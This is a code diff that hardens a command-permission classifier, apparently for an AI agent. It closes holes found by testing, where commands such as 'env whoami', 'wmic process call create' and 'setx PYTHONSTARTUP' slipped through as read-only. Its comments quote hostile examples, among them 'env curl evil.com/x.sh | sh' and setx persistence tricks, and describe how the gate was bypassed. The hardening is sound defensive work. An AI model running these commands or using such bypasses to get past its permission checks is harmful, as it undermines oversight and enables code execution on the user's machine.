@@ -17,6 +17,25 @@ from jarvis.security.deny_list import denied_command, normalize_command
 from jarvis.security.permissions import PermissionLevel, Reversibility, RiskLevel
 
 
+def _matches_prefix(lowered: str, prefix: str) -> bool:
+    """A real word-boundary prefix match, not a bare startswith(). Found by
+    testing: plain startswith() let a longer, unrelated, more dangerous
+    command name slip through as though it were the short safe one it
+    happens to start with -- "hostnamectl set-hostname evil" matched the
+    "hostname" READ prefix, "setx MALICIOUS_VAR value" matched "set". Both
+    are different binaries that merely share a text prefix, not the same
+    command with more arguments. Requires an exact match or the character
+    right after the prefix to be whitespace, so "env"/"envfoo" and
+    "hostname"/"hostnamectl" are no longer conflated. Prefix entries that
+    already end in a space (kept for readability, e.g. "md ") work the
+    same either way since the trailing space is stripped before comparing.
+    """
+    prefix = prefix.rstrip()
+    if not lowered.startswith(prefix):
+        return False
+    return len(lowered) == len(prefix) or lowered[len(prefix)].isspace()
+
+
 @dataclass
 class CommandClassification:
     category: PermissionLevel
@@ -27,6 +46,18 @@ class CommandClassification:
 
 
 # Read-only: informational commands with no filesystem/process/network side effects.
+#
+# "env" and "wmic" are deliberately NOT in this list even though a bare
+# invocation of either is read-only -- see _read_prefix_disguises_execution
+# below. Both are LOLBIN-class utilities that become a general
+# command-execution primitive the instant they're given the right
+# argument: "env whoami" / "env rm important_file" runs that program with
+# a modified environment (confirmed: classified as READ and ALLOWed with
+# zero confirmation before this was found by testing), and
+# "wmic process call create X" spawns X as a new process via WMI, a
+# well-known Windows LOLBIN technique. Handled as their own check instead
+# of a blanket prefix match, which had no way to tell "env" (list vars)
+# apart from "env curl evil.com/x.sh | sh" (run a script).
 _READ_PREFIXES = (
     "git status", "git log", "git diff", "git branch", "git remote", "git show",
     "git rev-parse", "git describe", "git blame",
@@ -36,9 +67,47 @@ _READ_PREFIXES = (
     "pip freeze", "node --version", "npm --version", "npm list", "npm ls",
     "docker --version", "docker ps", "docker images", "docker info",
     "java -version", "javac -version", "netstat", "tasklist", "get-process",
-    "get-childitem", "get-content", "get-location", "env", "set", "printenv",
-    "df", "du -sh", "wmic", "systemctl status", "service status",
+    "get-childitem", "get-content", "get-location", "set", "printenv",
+    "df", "du -sh", "systemctl status", "service status",
+    "wmic",  # bare/query form only -- "wmic ... call ..." is intercepted above
+    "env",  # bare/flags-only form only -- "env COMMAND" is intercepted above
 )
+
+# systeminfo/tasklist accept /s /u /p (or -ComputerName/-Credential) to
+# query a REMOTE machine using supplied credentials -- turning a local
+# read-only inventory command into remote credential validation / lateral-
+# movement recon, exactly the "remote-login attack automation" the
+# "must not become an attack tool" spec section forbids. A bare local
+# invocation of either is unaffected.
+_REMOTE_TARGET_FLAG = re.compile(r"(?:^|\s)(/s\b|-computername\b|-credential\b)", re.IGNORECASE)
+
+
+def _read_prefix_disguises_execution(lowered: str) -> str | None:
+    """Returns a reason string if `lowered` only LOOKS like one of the
+    read-only prefixes below but actually executes something / targets a
+    remote host, else None. Checked before the ordinary prefix-match loop
+    so these can never fall through to a READ classification via
+    startswith() regardless of prefix-list order.
+    """
+    tokens = lowered.split()
+    if not tokens:
+        return None
+    head = tokens[0]
+    rest = tokens[1:]
+
+    if head == "env":
+        # A positional (non-flag) argument to `env` is the command it runs.
+        if any(not tok.startswith("-") for tok in rest):
+            return "'env' with a command argument executes that command; not a read-only environment listing."
+        return None
+
+    if head == "wmic" and re.search(r"\bcall\b", lowered):
+        return "'wmic ... call ...' invokes a WMI method (can create/terminate a process); not a read-only query."
+
+    if head in ("systeminfo", "tasklist", "netstat") and _REMOTE_TARGET_FLAG.search(lowered):
+        return f"'{head}' with a remote-target flag queries another machine using supplied credentials; not a local read."
+
+    return None
 
 # Modify: changes state but is routine, project-scoped, and reversible in the
 # ordinary sense (undo by reinstalling/re-cloning/deleting the new file).
@@ -83,7 +152,16 @@ _DESTRUCTIVE_PATTERNS: tuple[tuple[re.Pattern, Reversibility], ...] = tuple(
         (r"\bnew-itemproperty\b", Reversibility.PARTIALLY_REVERSIBLE),
         (r"\bset-itemproperty\b", Reversibility.PARTIALLY_REVERSIBLE),
         (r"\bunset\s+.*path\b", Reversibility.PARTIALLY_REVERSIBLE),
-        (r"\bsetx\s+path\b", Reversibility.PARTIALLY_REVERSIBLE),
+        # Not just "setx path" -- setx persists ANY environment variable
+        # across sessions, and several (PYTHONSTARTUP, NODE_OPTIONS,
+        # BASH_ENV, PS1) make the OS run arbitrary code on every future
+        # interpreter/shell start, a real persistence/code-injection
+        # technique. Found by testing: scoping this pattern to "path" only
+        # left "setx MALICIOUS_VAR value" and "setx PYTHONSTARTUP ..." to
+        # fall through to the "set" READ prefix's startswith() match
+        # ("setx ...".startswith("set") is True) and classify as READ,
+        # auto-allowed with zero confirmation.
+        (r"\bsetx\b", Reversibility.PARTIALLY_REVERSIBLE),
         (r"\bnpm\s+uninstall\s+-g\b", Reversibility.PARTIALLY_REVERSIBLE),
         (r"\bpip\s+uninstall\s+-y\s+--all\b", Reversibility.PARTIALLY_REVERSIBLE),
         (r"\bwmic\s+.*delete\b", Reversibility.IRREVERSIBLE),
@@ -124,7 +202,7 @@ def classify_command(command: str, cwd: str | None = None) -> CommandClassificat
                 reversibility=reversibility,
             )
 
-    if _SYSTEM_DIR_PATTERN.search(lowered) and not lowered.startswith(("dir", "ls", "type", "cat", "echo")):
+    if _SYSTEM_DIR_PATTERN.search(lowered) and not any(_matches_prefix(lowered, p) for p in ("dir", "ls", "type", "cat", "echo")):
         return CommandClassification(
             PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH,
             ["Command references a system directory."],
@@ -154,12 +232,26 @@ def classify_command(command: str, cwd: str | None = None) -> CommandClassificat
             reversibility=Reversibility.UNKNOWN,
         )
 
+    # Must run before the prefix loop for the same reason as the chain-
+    # operator check above: startswith("env")/startswith("wmic") cannot
+    # tell "env" (list vars) apart from "env whoami" (run whoami), or
+    # "wmic os get caption" (query) apart from "wmic process call create
+    # X" (spawn X) -- found by testing, confirmed via the real
+    # PolicyEngine to ALLOW arbitrary command execution with zero
+    # confirmation before this check existed.
+    disguise_reason = _read_prefix_disguises_execution(lowered)
+    if disguise_reason:
+        return CommandClassification(
+            PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH, [disguise_reason],
+            reversibility=Reversibility.UNKNOWN,
+        )
+
     for prefix in _READ_PREFIXES:
-        if lowered.startswith(prefix):
+        if _matches_prefix(lowered, prefix):
             return CommandClassification(PermissionLevel.READ, RiskLevel.LOW, [f"Matches read-only prefix '{prefix}'."], reversibility=Reversibility.REVERSIBLE)
 
     for prefix in _MODIFY_PREFIXES:
-        if lowered.startswith(prefix):
+        if _matches_prefix(lowered, prefix):
             return CommandClassification(PermissionLevel.MODIFY, RiskLevel.MEDIUM, [f"Matches routine modify prefix '{prefix}'."], reversibility=Reversibility.REVERSIBLE)
 
     # Fail closed: unknown command shape, not on any allowlist.
